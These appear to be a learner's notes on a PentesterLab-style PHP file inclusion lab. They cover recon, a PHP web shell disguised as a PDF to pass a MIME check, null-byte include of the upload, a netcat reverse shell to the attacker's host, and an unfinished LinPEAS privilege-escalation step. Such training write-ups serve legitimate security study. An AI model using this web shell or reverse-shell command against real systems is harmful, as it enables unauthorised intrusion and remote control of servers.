PHP File Inclusion 
From: pentesterbootcamp

Obtained from ISO -- IP: 192.168.229.129



Change /hosts/etc to a domain

Step 1: sudo nano /etc/hosts
Step 2: add ip + new domain adress name


METHODOLOGY

	- FINGER PRINTING
	- IDENTIFYING VULNERABILITY
	- EXPLOITING
	- LATERAL MOVEMENT




FINGER PRINT

NMAP:
		-[PORTS]
			 ![[Pasted image 20220428130818.png]]

DIR SCANS:
	-[DIRSCAN]:: 
	-GOBUSTER::
![[Pasted image 20220428134051.png]]
	

	[NOTE]
Available directories including:
/images
/footer
/index
/header
/show
/main
/login
/uploads
/classes
/css
/submit

So far we can assume that we need to have  an account to log in and upload a malicious file.

NIKTO:
![[Pasted image 20220428135109.png]]


LOOKING FOR VULNERABILITIES:

From the Nikto search we confirmed that there is a PHP Local File Inclusion vulnerability.

Other vulnerability include: 
	-Old php and apache server is used
	-PHP inclusion vuln
	-login page
	-directories

We also found out that there are a few Directories such as log - in page, upload page and images page.

We can start looking at how to exploit the vulnerability of the page. 

Time to make our simple php inclusion!

We will follow the one from Pentesterlab which is a simple near (include()) code script which is

[<?php
include("header.php");
include($_GET["page"]);
?>]

This simple script will allow us to parse a get request in the URL. This $_GET request does not have any type of filter at all so this will allow us to go for a File_Include attack.

I went on to the Submit page and tried to put some input.
What I found was that:

1. mime_content_type()
2. Must be a PDF file

![[Pasted image 20220428141237.png]]

So because of this, we now have to change our script to a mime_content_type(PDF)

Because the submit page is only filtering PDF files to be uploaded.

I tried inputting  a few variables to the URL and see its reaction.

As noticed from its behaviour it seems to accept the input.

![[Pasted image 20220428163841.png]]

It responded with: no such file in the directory.....

Interesting...

Which means if there is such file in the directory we can get some sort of response? 

Let us try other things...

As you can see in the include() value.. It has a .php extension added to the submitted value.

![[Pasted image 20220428164234.png]]

I tried using a filre traversal method.. also i tried to escape the .php value by adding "%00" enconding to escape having a .php extension in the include section.

Okay so! In this case, we can tell that there is no Remote File Inclusion vulnerability, however this  could lead to Local File Inclusion!

The reason was, when we tried inputting [http://192.168.229.129/index.php?page=http://www.google.com/?] there was an error.

-----------------------------------------------

The ? at the end of the URL is used to ensure any extension or suffix added to the URL will be interpreted by Google's servers as a parameter. The configuration of the vulnerable system doesn't allow remote file include, the following error message is displayed:

--------------------------------------------------------

LOCAL FILE INCLUDE AND REMOTE FILE INCLUDE:

LOCAL FILE INCLUDE is an attack where the attacker uploads a specific type of document to a web application localy.

REMOTE FILE INCLUDE is an attack where the attacker sets up a separate web server and attached to that webser is a malicious file.. of which could be covered as .txt. Afterwards the attacker could then include the webserver using the URL prasing (Similar to the google include above) and the URL will read the webser, read the .txt file and execute whatever malicious content that is related to the document/file


-------------------------------------------------------

Local File (Exploitation)

At the moment we have the PHP script that we wrote a moment ago!

We also realised that the /submit form only accepts a mime_conent_type() and pdf none the less.

So we will create a PHP file that will appear to be a PDF format.

So what we will do is we modify the code to:

script.pdf
[%PDF-1.4
<?php
	system($_GET["cmd"]);
?>]]

The %PDF-1.4 is the identifier that is checked by the PHP function mime_content_type in order to funnel the document to the correct file type.

To check if the code is working try:

<?php
echo mime_content_type('script.pdf'). "\n";
?>

This will out put as:

![[Pasted image 20220428172604.png]]



Upon submission in the submit page (obviously our crafted file)

We can finally head to:

http://www.phpfile.com/index.php?page=uploads/script.pdf%00&cmd=ls%20-al

and it will look like this

![[Pasted image 20220428173340.png]]

--------------------------------------------------------

Now that we have exploited the system using our very own crafted payload. We will have to move laterally and use our payload!

FIrst I set the Netcat listener on one of my cmd:

sudo nc -l -p 80

netcat, -l  (listen mode to inbound connection) -p (port) 80 (the port)


![[Pasted image 20220428180629.png]]

I obtained a shell by encoding this to the URL:



http://www.phpfile.com/index.php?page=uploads/script.pdf%00&cmd=nc%20192.168.229.128%2080%20-e%20/bin/bash

![[Pasted image 20220428180658.png]]

NOTE [There are other ways to potentially secure reverse shell, but on this we can just use the URL (because it parses our command) straight sending a packet to the client side]



There may be other ways to obtain a reverse shell, you could even use the PDF method but that would be onto the next time.


TCP Redirect with SOCAT






---------------------------------------------------------

Obtaining root!!!


Maybe we can use LinPease?!

Hmmmm.....

------------------------------------------------

Priv Escalation:

1. I downloaded Linpease from the Client side (my OS)
2. I modified the lin pease to have %PDF-1.4 (So it could be accepted when I upload the file)
3. Ichanged the linpease name to lin.pdf (duhh for uploads)
4. Once I have uploaded the file.. I went to the servers (www.phpfile.com) /var/www/uploads page and found BOOOOM! lin.pdf is there!!

5. Once i found the lin i simply changed the .pdf extension back to .sh, I went to do [chmod +x lin.sh]
6. After changing the extension and the executable permission I run linpease in the back ground

![[Pasted image 20220428192945.png]]


Priv Escalation we will come back to it!


---------------------------------------------------------
